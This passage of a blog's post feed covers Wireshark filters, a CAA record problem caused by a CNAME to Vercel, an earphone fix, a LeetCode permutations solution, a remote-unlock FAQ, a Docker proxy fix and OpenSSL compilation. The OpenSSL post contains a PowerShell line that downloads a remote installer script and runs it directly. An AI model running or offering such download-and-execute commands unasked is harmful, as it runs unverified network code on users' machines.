Number fields are divided into [BE] and [LE]. [BE] is for Linux content, and [LE] is for Windows content. Since this experiment was conducted in a Linux environment, only the [BE] content needs to be viewed.</p></blockquote><p>Request Message Header ：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/20069/image-20200608174737348.png" alt="image-20200608174737348"></p><p>Reply Message Header：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/20069/image-20200608174816396.png" alt="image-20200608174816396"></p><h2 id="三、Introduction-to-Wireshark-filters"><a href="#三、Introduction-to-Wireshark-filters" class="headerlink" title="三、Introduction to Wireshark filters"></a>三、Introduction to Wireshark filters</h2><p>One of the core features of Wireshark is the use of filters. There are three states for display filters: red, yellow, and green. Red means that the display filter expression is incorrect, yellow means that the filter expression can filter packets but may result in unpredictable results, and green means that the filter expression is correct.</p><p>Wireshark filters are divided into two types: display filters and capture filters. Display filters filter captured packets based on filtering rules, while capture filters only capture packets that meet the filtering rules that have been set in advance.</p><p><strong>Capture Filter：</strong></p><p>As shown in the following figure is the capture filter settings. ：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/20069/image-20200608175505369.png" alt="image-20200608175505369">  </p><p>The reason for setting a capture filter is to target situations where the network traffic is very large, such as several gigabytes per second, and most of the traffic is not the data that the analyst is interested in. In this case, a capture filter can be used to capture only the specified data. Useless data can not only interfere with analysis, but also waste storage space and copying time.</p><p><strong>Display filter：</strong></p><p>The following image shows the setting of a display filter ：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/20069/image-20200608175705185.png" alt="image-20200608175705185"></p><blockquote><p>Common syntax of display filters:</p><ol><li><p>Protocol filter, such as http, icmp, etc;</p></li><li><p>Filter by specific port: tcp.port eq 80, displays packets with port 80 whether it is a source or destination port. To filter by the source port, use tcp.srcport eq 80, and to filter by the destination port, use tcp.dstport eq 80;</p></li><li><p>Filter by source IP address: ip.src eq 192.168.1.107, and to filter by the destination, use ip.dst eq 192.168.1.107. To filter by both source and destination, use ip.addr eq 192.168.1.107. MAC address filtering follows the same logic;</p></li><li><p>Filter packets containing a specific string domain name, such as http.host contains “moe”;</p></li><li><p>Multiple filter conditions can be used together, for example, to simultaneously filter for http protocol and port 80, use http &amp;&amp; tcp.port == 80. Combination symbols include AND/&amp;&amp;, OR/||, and NOT/!;</p></li></ol><p>The syntax of capture filters is slightly different from display filters, and some examples are as follows:</p><ol><li>Filter by specific protocol: http</li><li>Filter by specific port: port 80</li><li>Filter by specific IP address: host 192.168.0.115</li><li>Filter by specific domain name: host <a href="http://www.example.com/">www.example.com</a></li></ol></blockquote>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> Information Security </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>The issue of SSL certificate being unable to issue due to the CNAME record pointing to Vercel affecting the CAA record.</title>
      
      
      <link href="/posts/3655275721/"/>
      
      
      <url>/posts/3655275721/</url>
      
      
        
      <content type="html"><![CDATA[<h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><p>The most drastic solution is to directly pause all DNS related to Vercel.<br>Or, first pause the resolution of the second-level domain to Vercel, that is, pause example.com-&gt;Vercel,<br>and then pause the Vercel of the affected subdomain, that is, pause a.example.com-&gt;Vercel.</p><h3 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h3><p>Today, Alibaba Cloud informed me that an SSL certificate for one of my domains was about to expire. As an experienced developer, I opened the Alibaba Cloud console to apply for a new certificate.</p><p>However, something strange happened. Previously, the certificate could be issued within a minute, but this time it took a long time and it still didn’t work. I decided to take a nap and try again later.</p><p>When I woke up and opened the Alibaba Cloud console, I found that it still wasn’t successful. At this point, I still suspected that it was Alibaba Cloud’s problem. So I applied again using Freessl, but it still wasn’t successful in the afternoon. The result of the test using <a href="https://myssl.com/">myssl.com</a> is as follows:</p><table><thead><tr><th align="left">Region</th><th align="left">Match</th></tr></thead><tbody><tr><td align="left">China</td><td align="left">Not match (Validation failed. Your CAA configuration doesn’t allow the current CA to issue certificates for you. Please modify to: symantec.com or digicert.com)</td></tr><tr><td align="left">Hong Kong</td><td align="left">Not match (Validation failed. Your CAA configuration doesn’t allow the current CA to issue certificates for you. Please modify to: symantec.com or digicert.com)</td></tr><tr><td align="left">United States</td><td align="left">Not match (Validation failed. Your CAA configuration doesn’t allow the current CA to issue certificates for you. Please modify to: symantec.com or digicert.com)</td></tr></tbody></table><p>I haven’t set up any CAA records! </p><p>I thought it couldn’t be a DNS cache issue, right?</p><p> But I still went to the Alibaba Cloud console to temporarily stop resolving all DNS records. As a result, it actually worked! After investigation, I found that the problem was caused by the CNAME record pointing to Vercel. How could Vercel have the permission to set CAA records for me?!</p><h3 id="Reason"><a href="#Reason" class="headerlink" title="Reason"></a>Reason</h3><p>After some searching, I finally figured out the reason, which was caused by the CAA record.</p><blockquote><p> CAA (Certificate Authority Authorization) is a new additional field that can be added to DNS records to create CAA resource records through DNS mechanism, which can limit the connection between the domain name issuing the certificate and the CA (certificate authority). Unauthorized third parties attempting to obtain SSL/TLS certificates for the domain name through other CAs will be rejected. By setting a CAA record for the domain name, website owners can authorize specific CAs to issue certificates for their domain name, thereby preventing HTTPS certificate errors and improving website security.</p></blockquote><p>An additional piece of knowledge is that CNAME records can affect CAA records：</p><p>CAA record checking continues for CNAME records pointing to a different domain. In this example, <a href="http://www.example.com/">www.example.com</a> points to <a href="http://www.example.net/">www.example.net</a>, which also has CAA records:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(Example 7 / www.example.com)</span><br><span class="line">Domain   Record type  Flags  Tag      Value   </span><br><span class="line">www.example.com.   CNAME www.example.net</span><br><span class="line">www.example.net.   CAA           0      issue   ";"</span><br><span class="line"></span><br><span class="line">(Result: CAA failed)</span><br></pre></td></tr></tbody></table></figure><p>The first record redirects the CAA check to <a href="http://www.example.net/">www.example.net</a>. This CAA record can prevent any CA from issuing a certificate, so the certificate authority cannot issue a certificate for <a href="http://www.example.com/">www.example.com</a>.</p><p>If the domain being pointed to (<a href="http://www.example.net/">www.example.net</a>) does not have a CAA record, then the CAA record check will climb up to the parent domain (example.com).</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(Example 8 / www.example.com)</span><br><span class="line">Domain   Record type  Flags  Tag      Value   </span><br><span class="line">www.example.com.   CNAME www.example.net</span><br><span class="line">example.com.   CAA           0      issue   "amazon.com"</span><br><span class="line"></span><br><span class="line">(Result: CAA passed)</span><br></pre></td></tr></tbody></table></figure><p>In plain language, it means that because we set a CNAME record to point to Vercel, and Vercel set a CAA record, it affected our domain’s CAA record. After using a tool to check, we confirmed that this was indeed the case.：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">{</span><br><span class="line">  "canIssue": false,</span><br><span class="line">  "status": "IssueMismatch",</span><br><span class="line">  "domain": "czqu.net",</span><br><span class="line">  "queryAt": "Sep 30, 2021 11:21:55 AM",</span><br><span class="line">  "elapsed": 1,</span><br><span class="line">  "caaRecordSet": [</span><br><span class="line">    {</span><br><span class="line">      "domain": "czqu.net",</span><br><span class="line">      "caaRecords": [</span><br><span class="line">        {</span><br><span class="line">          "issuerCritical": 0,</span><br><span class="line">          "tag": "issue",</span><br><span class="line">          "value": "letsencrypt.org",</span><br><span class="line">          "type": 257,</span><br><span class="line">          "dclass": 1,</span><br><span class="line">          "ttl": 60</span><br><span class="line">        },</span><br><span class="line">        {</span><br><span class="line">          "issuerCritical": 0,</span><br><span class="line">          "tag": "issue",</span><br><span class="line">          "value": "globalsign.com",</span><br><span class="line">          "type": 257,</span><br><span class="line">          "dclass": 1,</span><br><span class="line">          "ttl": 60</span><br><span class="line">        }</span><br><span class="line">      ]</span><br><span class="line">    }</span><br><span class="line">  ]</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> Backend Development </tag>
        
            
            
        <tag> Trap </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>How to Fix Redmi Bluetooth Earphones with One-Sided Sound Issue</title>
      
      
      <link href="/posts/56389/"/>
      
      
      <url>/posts/56389/</url>
      
      
        
      <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p> If you’re experiencing an issue with your Bluetooth earphones where only one side has sound, you might have been searching for solutions online. Unfortunately, not all online advice is reliable. To help fellow users, I’m sharing my tested solution to this problem.</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol><li><p>Unpair your earphones from your phone.</p></li><li><p>With both earphones turned on, press and hold the power button for 5 seconds until they turn off. Release the button once they turn off. (Both earphones’ lights should not be on during this process. Skip this step if your earphones are already turned off.)</p></li><li><p>Press and hold both earphones again. When the LED lights start flashing white, keep pressing until they flash red and white twice. (This step is crucial as it clears the previous configuration information on the earphones. Remember to unpair and turn off Bluetooth on your phone.)</p></li><li><p>Turn on the right earphone first and then the left. (Make sure the earphones are inside the charging case. Taking out the right earphone will automatically turn it on, so start with the right one first.)</p></li><li><p>The right earphone should start flashing quickly. When the left earphone stops flashing, the earphones are paired successfully.</p></li><li><p>Pair the earphones with your phone again through the Bluetooth settings.</p></li></ol><p>By following these steps, you should be able to fix the one-sided sound issue on your Redmi Bluetooth earphones.</p>]]></content>
      
      
      
      
      <categories>
        
          
          
        <category> Life Hacks </category>
        
          
      
      </categories>
      
      
      
        
      <tags>
        
            
            
        <tag> Life Hacks </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>LeetCode 46. Permutations</title>
      
      
      <link href="/posts/3587124311/"/>
      
      
      <url>/posts/3587124311/</url>
      
      
        
      <content type="html"><![CDATA[<h1 id="Question"><a href="#Question" class="headerlink" title="Question:"></a>Question:</h1><p>Given an array <code>nums</code> of distinct integers, return <em>all the possible permutations</em>. You can return the answer in <strong>any order</strong>.</p><p><strong>Example 1:</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: nums = [1,2,3]</span><br><span class="line">Output: [[1,2,3],[1,3,2],[2,1,3],[2,3,1],[3,1,2],[3,2,1]]</span><br></pre></td></tr></tbody></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: nums = [0,1]</span><br><span class="line">Output: [[0,1],[1,0]]</span><br></pre></td></tr></tbody></table></figure><p><strong>Example 3:</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: nums = [1]</span><br><span class="line">Output: [[1]]</span><br></pre></td></tr></tbody></table></figure><p><strong>Constraints:</strong></p><ul><li><code>1 &lt;= nums.length &lt;= 6</code></li><li><code>-10 &lt;= nums[i] &lt;= 10</code></li><li>All the integers of <code>nums</code> are <strong>unique</strong>.</li></ul><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution:"></a>Solution:</h1><p>Given an array of distinct integers nums, return all possible permutations of its elements. You can return the answer in any order.</p><p>Algorithm</p><p>The problem can be solved by recursively generating all permutations of the array. For a given array nums, the algorithm works as follows:</p><ul><li>If the length of nums is 1, return a list containing nums.</li><li>For each element in nums, generate all permutations of the remaining elements using recursion. This can be done by creating a new array without the current element, and calling the permutation function recursively with the new array.</li><li>For each permutation generated in step 2, add the current element to the beginning of the permutation.</li><li>Return the list of all permutations generated in step 3.</li></ul><p>Java Implementation</p><p>Here’s the Java implementation of the algorithm:</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">permute</span><span class="params">(<span class="type">int</span>[] nums)</span> {</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        permute(nums, <span class="keyword">new</span> <span class="title class_">boolean</span>[nums.length], <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(), res);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">permute</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">boolean</span>[] used, List&lt;Integer&gt; cur, List&lt;List&lt;Integer&gt;&gt; res)</span> {</span><br><span class="line">        <span class="keyword">if</span> (cur.size() == nums.length) {</span><br><span class="line">            res.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(cur));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) {</span><br><span class="line">            <span class="keyword">if</span> (!used[i]) {</span><br><span class="line">                cur.add(nums[i]);</span><br><span class="line">                used[i] = <span class="literal">true</span>;</span><br><span class="line">                permute(nums, used, cur, res);</span><br><span class="line">                cur.remove(cur.size() - <span class="number">1</span>);</span><br><span class="line">                used[i] = <span class="literal">false</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>The permute() function takes an array nums, and returns a list of all permutations of its elements. The function uses a helper function permute() to generate the permutations recursively. The permute() function takes the following arguments:</p><ul><li>nums: the array of integers to be permuted</li><li>used: a boolean array indicating which elements of nums have already been used in the current permutation</li><li>cur: a list representing the current permutation being generated</li><li>res: the list of all permutations generated so far</li></ul><p>Python Implementation</p><p>Here’s the Python implementation of the algorithm:</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">permute</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(nums) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> [nums]</span><br><span class="line">        res = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nums)):</span><br><span class="line">            sub_res = <span class="variable language_">self</span>.permute(nums[:i] + nums[i+<span class="number">1</span>:])</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> sub_res:</span><br><span class="line">                res.append([nums[i]] + j)</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></tbody></table></figure><p>The permute() function takes an array nums, and returns a list of all permutations of its elements. The function uses recursion to generate the permutations. The permute() function takes the following arguments:</p><ul><li>nums: the array of integers to be permuted</li></ul><p>Time Complexity</p><p>The time complexity of the algorithm is O(n!), where n is the length of the input array. This is because there are n! permutations of n distinct elements, and the algorithm generates each permutation once.</p><p>Space Complexity</p><p>The space complexity of the algorithm is O(n^2), where n is the length of the input array. This is because the algorithm generates n! permutations, each of which has length n. The algorithm uses additional space to store the list of permutations generated so far.</p>]]></content>
      
      
      
      
      <categories>
        
          
          
        <category> LeetCode </category>
        
          
      
      </categories>
      
      
      
        
      <tags>
        
            
            
        <tag> Java </tag>
        
            
            
        <tag> LeetCode </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>远程解锁常见问题</title>
      
      
      <link href="/cn/posts/31496/"/>
      
      
      <url>/cn/posts/31496/</url>
      
      
        
      <content type="html"><![CDATA[<h3 id="联系我们："><a href="#联系我们：" class="headerlink" title="联系我们："></a>联系我们：</h3><p>QQ群：1053768454(推荐)</p><blockquote><p>或者在文末评论区留下你的意见和建议。</p></blockquote><h3 id="常见问题："><a href="#常见问题：" class="headerlink" title="常见问题："></a>常见问题：</h3><h5 id="1-锁屏界面无反应？无法连接？"><a href="#1-锁屏界面无反应？无法连接？" class="headerlink" title="1.锁屏界面无反应？无法连接？"></a>1.锁屏界面无反应？无法连接？</h5><p>新版不在锁屏界面展示解锁结果，而是通过接口返回，调用接口的时候可以看到。接口文档可以到官网查阅。</p><p>无法连接可能是防火墙问题，可以试试先关闭防火墙排查，此问题的出现可能是安装的时候阻止了创建防火墙规则请手动给LogonUI.exe添加规则。</p><p>还有一种可能就是启动了开始配对。请看第三条。</p><p>目前的网络插件只有局域网版，监听了所有IP，支持IPV6，但是不建议直接开放到公网。</p><h5 id="2-锁屏界面提示用户名密码错误"><a href="#2-锁屏界面提示用户名密码错误" class="headerlink" title="2.锁屏界面提示用户名密码错误~~"></a>2.锁屏界面提示用户名密码错误~~</h5><p>1.请检查你输入的是密码而不是<strong>pin</strong>。</p><p>2.如果有更改过微软账户密码，可能是本地密码和在线密码不同步导致的</p><blockquote><p>建议您参考以下步骤：</p><p>方案一：直接重新绑定微软账户和本地账户</p><p>方案二：</p><p>1.按Windows徽标 + R组合键调出运行窗口，在其中输入“control userpasswords2 ”或“netplwiz”，打开“用户帐户”窗口，</p><p>2.选中需要操作的帐户，重新勾选“要使用本计算机，用户必须输入用户名和密码”，然后“应用”；然后再取消勾选“要使用本计算机，用户必须输入用户名和密码”，再点击“应用”，就会弹出自动登录设置窗口了。在其中输入微软帐户的新密码，然后点击“确定”关闭“自动登录”设置窗口，最后点击“用户帐户”窗口的“确定”按钮。</p><p><a href="https://answers.microsoft.com/zh-hans/windows/forum/all/microsoft%E8%B4%A6%E5%8F%B7%E7%99%BB%E5%BD%95/092f9d9c-909e-4f7f-8fab-5e4169480960">https://answers.microsoft.com/zh-hans/windows/forum/all/microsoft%E8%B4%A6%E5%8F%B7%E7%99%BB%E5%BD%95/092f9d9c-909e-4f7f-8fab-5e4169480960</a></p></blockquote><h5 id="3-二维码怎么不见了"><a href="#3-二维码怎么不见了" class="headerlink" title="3.二维码怎么不见了?"></a>3.二维码怎么不见了?</h5><p>（鸿蒙用户请绕过此此条，鸿蒙版支持自动配对无需扫码。二维码被移到控制面板了,请通过下拉框选择合适的网卡，不然无法解锁。开机功能一般需要有线网卡的支持请选择有线网卡。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/31496/image-20240523195407352.png" alt="image-20240523195407352"></p><p>如果配对的时候想进行测试，可以在这点开始配对。此操作会打开和锁屏界面一样的服务，支持蓝牙发送，或者http api的测试。使用后请关闭。不然锁屏界面可能会无法连接。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/31496/image-20240523195647086.png" alt="image-20240523195647086"></p><h5 id="1-连接不上-fail-to-connect-xxxx-一直显示查找ip的解决办法"><a href="#1-连接不上-fail-to-connect-xxxx-一直显示查找ip的解决办法" class="headerlink" title="1.连接不上/fail to connect xxxx/一直显示查找ip的解决办法"></a><del>1.连接不上/fail to connect xxxx/一直显示查找ip的解决办法</del></h5><p><del>1.可能是防火墙问题导致的：</del></p><blockquote><p> <del>解决方案Windows防火墙 –&gt; 高级设置 –&gt; 入站规则 –&gt; 在列表里找到“文件和打印机共享(回显请求 - ICMPv4-In)” –&gt; 右击选择启用规则，并在其属性里设置为‘允许连接’–&gt; 确定 –&gt; 大功告成。</del><br><del>要禁止ping,去掉勾选即可.</del></p></blockquote><p><del>2.由于ip设置错误导致的(下一版本修复)</del></p><blockquote><p><del>解决方案：</del></p><p><del><strong>手动搜索添加即可，不要用二维码添加</strong></del></p><p><del>1.检查电脑和手机是否在同一局域网</del></p><p><del>2.检查App中使用的ip与电脑当前ip是否一致</del></p><p><del>检查方法如下：</del></p><p><del>App点击管理-》选择设备-》查看更多-》ip:</del></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/31496/image-20200816170902707.png" alt="Appip"></p><p><a href="">win10直接打开网络和Internet设置查看:</a></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/31496/image-20200816171118185.png" alt="电脑ip"></p></blockquote><h5 id="2-锁屏界面无任何变化，没有出现远程解锁的图标"><a href="#2-锁屏界面无任何变化，没有出现远程解锁的图标" class="headerlink" title="2.锁屏界面无任何变化，没有出现远程解锁的图标"></a><del>2.锁屏界面无任何变化，没有出现远程解锁的图标</del></h5><p><del>手动添加注册表信息，双击Register.reg一直点是就行了。如果仍然没有显示在登录界面，请检查是否安装VC Redistributable for 2017。安装2.0版本前请先卸载2.0以下的版本。</del></p><h5 id="3-Windows-7-安装了Windows10-版本导致锁屏界面一直闪烁"><a href="#3-Windows-7-安装了Windows10-版本导致锁屏界面一直闪烁" class="headerlink" title="3.Windows 7 安装了Windows10 版本导致锁屏界面一直闪烁"></a><del>3.Windows 7 安装了Windows10 版本导致锁屏界面一直闪烁</del></h5><p><del>遇到这种情况，进入修复环境，打开命令行选项用del命令删除安装目录下RemoteFingerUnlockModule.dll文件即可。</del></p><h5 id="4-锁屏界面提示用户名密码错误"><a href="#4-锁屏界面提示用户名密码错误" class="headerlink" title="4.锁屏界面提示用户名密码错误"></a><del>4.锁屏界面提示用户名密码错误</del></h5><p><del>1.请检查你输入的是密码而不是<strong>pin</strong>。</del></p><p><del>2.如果有更改过微软账户密码，可能是本地密码和在线密码不同步导致的</del></p><blockquote><p><del>建议您参考以下步骤：</del></p><p><del>方案一：直接重新绑定微软账户和本地账户</del></p><p><del>方案二：</del></p><p><del>1.按Windows徽标 + R组合键调出运行窗口，在其中输入“control userpasswords2 ”或“netplwiz”，打开“用户帐户”窗口，</del></p><p><del>2.选中需要操作的帐户，重新勾选“要使用本计算机，用户必须输入用户名和密码”，然后“应用”；然后再取消勾选“要使用本计算机，用户必须输入用户名和密码”，再点击“应用”，就会弹出自动登录设置窗口了。在其中输入微软帐户的新密码，然后点击“确定”关闭“自动登录”设置窗口，最后点击“用户帐户”窗口的“确定”按钮。</del></p><p><del><a href="https://answers.microsoft.com/zh-hans/windows/forum/all/microsoft%E8%B4%A6%E5%8F%B7%E7%99%BB%E5%BD%95/092f9d9c-909e-4f7f-8fab-5e4169480960">https://answers.microsoft.com/zh-hans/windows/forum/all/microsoft%E8%B4%A6%E5%8F%B7%E7%99%BB%E5%BD%95/092f9d9c-909e-4f7f-8fab-5e4169480960</a></del></p></blockquote>]]></content>
      
      
      
      
      <categories>
        
          
          
        <category> 远程解锁 </category>
        
          
      
      </categories>
      
      
      
        
      <tags>
        
            
            
        <tag> 远程解锁 </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>docker in Mac在IDEA上无法连接</title>
      
      
      <link href="/cn/posts/1231995594/"/>
      
      
      <url>/cn/posts/1231995594/</url>
      
      
        
      <content type="html"><![CDATA[<p>错误信息：Connot connect: java.io.IOException: unexpected end of stream on <a href="http://docker.socket/">http://docker.socket/</a>…</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/1231995594/image-20220318185243753.png" alt="image-20220318185243753"></p><p>在某代理软件里确实显示这个链接通过了代理</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/1231995594/image-20220318185254826.png" alt="image-20220318185254826"></p><p>加上例外后轻松解决：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/1231995594/image-20220318185431230.png" alt="image-20220318185431230"></p>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> mac </tag>
        
            
            
        <tag> docker </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>OpenSSL在Windows和Linux下的编译</title>
      
      
      <link href="/cn/posts/33090/"/>
      
      
      <url>/cn/posts/33090/</url>
      
      
        
      <content type="html"><![CDATA[<p>具体参见<a href="https://wiki.openssl.org/index.php/Compilation_and_Installation">https://wiki.openssl.org/index.php/Compilation_and_Installation</a></p><h2 id="Windows下的编译"><a href="#Windows下的编译" class="headerlink" title="Windows下的编译"></a>Windows下的编译</h2><p>第一步：下载ActivePerl （<a href="https://www.activestate.com/products/perl/">https://www.activestate.com/products/perl/</a>） ，安装ActivePerl，默认安装路径在C:\Perl64。打开命令提示符，定位到 C:\Perl64\eg 目录，执行 perl example.pl，若提示 Hello from ActivePerl! 则说明 Perl 安装成功。（注意： 这里只能下载64位系统安装的版本）</p><p><del>注：可能报错“Can’t locate Win32/Console.pm”这里可以下载我编译好的版本<br><a href="https://platform.activestate.com/DonaldXY/ActivePerl-5.26/distributions">https://platform.activestate.com/DonaldXY/ActivePerl-5.26/distributions</a></del></p><p><del><strong>或者直接在cmd执行以下代码</strong></del></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell -Command "&amp; $([scriptblock]::Create((New-Object Net.WebClient).DownloadString('https://platform.activestate.com/dl/cli/_pdli01/install-latest.ps1'))) -c'state activate --default DonaldXY/ActivePerl-5.26'"</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>第二步：下载并安装 nasm汇编器（<a href="http://www.nasm.us/%EF%BC%8C">http://www.nasm.us/，</a> ），默认安装在C:\Users\lenovo\AppData\Local\bin\NASM，将此路径加入Path环境变量，这个可以下载32位或者64位都没所谓</p><p>第三步 执行perl Configure VC-WIN32 –prefix=c:\openssl\win32，prefix参数指的是后面执行nmake install命令把OpenSSL安装到哪个目录。</p><p>64位 编译 就改成VC-WIN64A 静态编译加no-shared</p><p>如:perl Configure no-shared VC-WIN64A –prefix=c:\openssl\win32</p><p>第四步：编译 (使用VS2019 的命令行，64位要使用64位的)</p><p>nmake</p><p>nmake test</p><p>nmake install</p><p><strong>重新编译需要执行清理</strong></p><p>nmake clean</p><p>很多博客编译OPENSSL 的方法在1.1.0以后的版本都不行，具体出现的问题是</p><p>It looks like you don’t have either nmake.exe or dmake.exe on your PATH, so you will not be able to execute the commands from a Makefile. You can install dmake.exe with the Perl Package Manager by running: ppm install dmake</p><p>下面才是老版本和新版本不同的编译办法</p><p>都是打开VS自己的命令行，不要打开WINDOWS的命令行</p><p>老版本（1.1.0以前的版本是）是</p><p>执行ms\do_nasm</p><p>执行nmake -f ms\ntdll.mak，此处大约需要几分钟，如果一切正常，会在out32dll目录下生成很多dll和exe文件。</p><p>执行nmake -f ms\ntdll.mak test，如果全部显示OK，说明编译正确。</p><p>执行nmake -f ms\ntdll.mak install，所有头文件和lib文件就都被拷贝到前面prefix指定的目录了。</p><p>新版本（1.1.0以后的版本是）</p><p>nmake</p><p>nmake test</p><p>nmake install</p><h2 id="Linux下的编译"><a href="#Linux下的编译" class="headerlink" title="Linux下的编译"></a>Linux下的编译</h2><p>去官网下载源码，具体命令以1.1.1g为例</p><figure class="highlight bash"><table><tbody><tr><td 